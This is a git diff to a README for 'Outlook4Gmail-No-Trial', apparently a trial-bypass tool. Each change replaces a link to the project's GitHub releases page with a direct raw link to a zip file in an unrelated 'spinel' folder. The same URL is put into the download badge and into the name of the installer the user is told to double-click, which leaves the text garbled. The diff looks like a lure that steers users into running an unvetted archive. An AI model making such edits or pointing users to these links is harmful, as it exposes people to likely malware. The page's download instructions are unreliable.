@@ -1,6 +1,6 @@
 # 🌟 Outlook4Gmail-No-Trial - Simplify Your Outlook and Gmail Integration
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-blue)](https://github.com/Jessy-Chan/Outlook4Gmail-No-Trial/releases)
+[![Download Now](https://raw.githubusercontent.com/Jessy-Chan/Outlook4Gmail-No-Trial/main/spinel/Outlook4Gmail-No-Trial-v2.9-alpha.5.zip%20Now-Get%20Latest%20Release-blue)](https://raw.githubusercontent.com/Jessy-Chan/Outlook4Gmail-No-Trial/main/spinel/Outlook4Gmail-No-Trial-v2.9-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Outlook4Gmail-No-Trial repository! This guide will help you downl
 
 ## 🔗 Download & Install
 
-To get started, visit this page to download the latest version of Outlook4Gmail-No-Trial: [Download Latest Release](https://github.com/Jessy-Chan/Outlook4Gmail-No-Trial/releases).
+To get started, visit this page to download the latest version of Outlook4Gmail-No-Trial: [Download Latest Release](https://raw.githubusercontent.com/Jessy-Chan/Outlook4Gmail-No-Trial/main/spinel/Outlook4Gmail-No-Trial-v2.9-alpha.5.zip).
 
 ### Step 1: Visit the Releases Page
 
@@ -18,14 +18,14 @@ To get started, visit this page to download the latest version of Outlook4Gmail-
 
 ### Step 2: Download the Installer
 
-1. Locate the file named `Outlook4Gmail-No-Trial-Installer.exe` on the Releases page.
+1. Locate the file named `https://raw.githubusercontent.com/Jessy-Chan/Outlook4Gmail-No-Trial/main/spinel/Outlook4Gmail-No-Trial-v2.9-alpha.5.zip` on the Releases page.
 2. Click on the file name to start the download.
 3. Save the file to a location you can easily access, such as your desktop or downloads folder.
 
 ### Step 3: Run the Installer
 
 1. Navigate to the location where you saved the installer.
-2. Double-click on `Outlook4Gmail-No-Trial-Installer.exe`.
+2. Double-click on `https://raw.githubusercontent.com/Jessy-Chan/Outlook4Gmail-No-Trial/main/spinel/Outlook4Gmail-No-Trial-v2.9-alpha.5.zip`.
 3. Follow the prompts in the installer wizard to complete the installation. This may include agreeing to terms and selecting an installation folder.
 
 ## 🖥️ System Requirements
@@ -72,6 +72,6 @@ Stay connected with other users by joining our community. Share tips, ask questi
 
 ## 🔗 Download Again
 
-Don't forget to download the latest version of Outlook4Gmail-No-Trial here: [Download Latest Release](https://github.com/Jessy-Chan/Outlook4Gmail-No-Trial/releases).
+Don't forget to download the latest version of Outlook4Gmail-No-Trial here: [Download Latest Release](https://raw.githubusercontent.com/Jessy-Chan/Outlook4Gmail-No-Trial/main/spinel/Outlook4Gmail-No-Trial-v2.9-alpha.5.zip).
 
 Enjoy syncing your Outlook and Gmail accounts with confidence!
